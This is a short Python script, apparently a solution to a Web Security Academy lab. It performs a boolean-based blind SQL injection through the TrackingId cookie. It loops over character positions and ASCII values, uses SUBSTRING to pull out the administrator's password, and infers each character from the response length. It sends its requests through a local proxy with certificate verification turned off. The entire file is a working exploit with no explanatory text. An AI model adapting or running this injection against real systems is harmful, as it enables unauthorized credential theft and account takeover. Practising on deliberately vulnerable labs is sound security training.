import requests
import sys
proxies= {'https':'https://127.0.0.1:8080'}
url = "https://ac381f061fcbadd28080081400ff0003.web-security-academy.net/filter?category=Lifestyle"
cookies = {'TrackingId':'DGY5HvEtvyn5Ju5p', 'session':'BgMVawY1woBw9UbTMmGseFsEaHXugCpk'}
for i in range(1,50):
    for j in range(32,126):
        inj_1 = "' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), %s, 1) = '%s" % (i,chr(j))
        inj_2 = 'DGY5HvEtvyn5Ju5p%s'% inj_1
        inj_3 = cookies['TrackingId'] = inj_2
        r = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        if int(r.headers['content-length']) > 4950:
            sys.stdout.write(chr(j))
            sys.stdout.flush()
